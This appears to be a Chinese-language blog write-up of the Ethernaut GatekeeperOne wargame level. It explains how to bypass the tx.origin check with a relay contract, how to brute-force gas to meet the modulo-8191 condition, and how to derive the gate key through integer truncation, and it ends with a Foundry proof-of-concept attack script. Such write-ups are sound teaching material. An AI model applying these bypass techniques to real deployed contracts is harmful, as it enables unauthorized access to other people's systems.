---
title: "Gatekeeper_one"
date: 2026-07-12
draft: false
description: "限制gas费，取字节规则"
tags:
  - Ethernaut
  - Gas费
categories:
  - Ethernaut
series:
  - Ethernaut 闯关记录
---
## Gatekeeper_one

### 目标：

通过守门人的检查，成功进入

### 思路：

第一关就是写一个中间合约，绕过`require(msg.sender != tx.origin)`检查即可解决

第二关的目的是限制gas费用，通过call函数调用合约，可以限制gas费用，然后利用for循环进行暴力搜索。如果gas费为8191的倍数自动停止搜索，注意搜索的范围不能过大，否则会导致`gas limit too high`而报错

#### 第三关：

tx.origin即为我自己钱包的地址

uint160(tx.origin)  = 0x02bd6515DDbDa0bdb18647f99C73011aAb1772A8

uint16(uint160(tx.origin)) =  0x72A8

根据第三个条件`require(uint32(uint64(_gateKey)) == uint16(uint160(tx.origin))`得出：

因为 `uint32(uint64(_gateKey)) == uint16(uint160(tx.origin)) `

所以 `uint32(uint64(_gateKey)) == 0x000072A8` 

根据第一个条件`require(uint32(uint64(_gateKey)) == uint16(uint64(_gateKey))`得出：

`uint16(_gateKey) = 0x72A8`，所以中间的两个字节可以为任意数

最后看第二个条件：`require(uint32(uint64(_gateKey)) != uint64(_gateKey)`

代表_gatekey最后四个字节不可以全为零即可

综上所述：`_gatekey = 0x1000000000072A8 `

### 源码：

```
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract GatekeeperOne {
    address public entrant;

    modifier gateOne() {
        require(msg.sender != tx.origin);
        _;
    }

    modifier gateTwo() {
        require(gasleft() % 8191 == 0);
        _;
    }

    modifier gateThree(bytes8 _gateKey) {
        require(uint32(uint64(_gateKey)) == uint16(uint64(_gateKey)), "GatekeeperOne: invalid gateThree part one");
        require(uint32(uint64(_gateKey)) != uint64(_gateKey), "GatekeeperOne: invalid gateThree part two");
        require(uint32(uint64(_gateKey)) == uint16(uint160(tx.origin)), "GatekeeperOne: invalid gateThree part three");
        _;
    }

    function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) returns (bool) {
        entrant = tx.origin;
        return true;
    }
}
```

### poc:

```
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../src/Gatekeeper_one.sol";
import "forge-std/Script.sol";

contract Middle{
    GatekeeperOne public target = GatekeeperOne(0x9CefB791fA20243d47D53209375C853a94c5A9D8);

    function attack() external{
        bool success;
        bytes8 _gateKey = bytes8(uint64(0x1000000000072A8));
        for(uint256 i = 0;i<8191;i++){
            (success, ) = address(target).call{gas:8191*10+i}(abi.encodeWithSignature("enter(bytes8)",_gateKey));
            if (success){
            break;
            }
        }
        require(success,"Failed");
    }
}

contract Attack is Script{
    function run() external{
        vm.startBroadcast();

        Middle middle = new Middle();
        middle.attack();

        vm.stopBroadcast();
    }
}
```

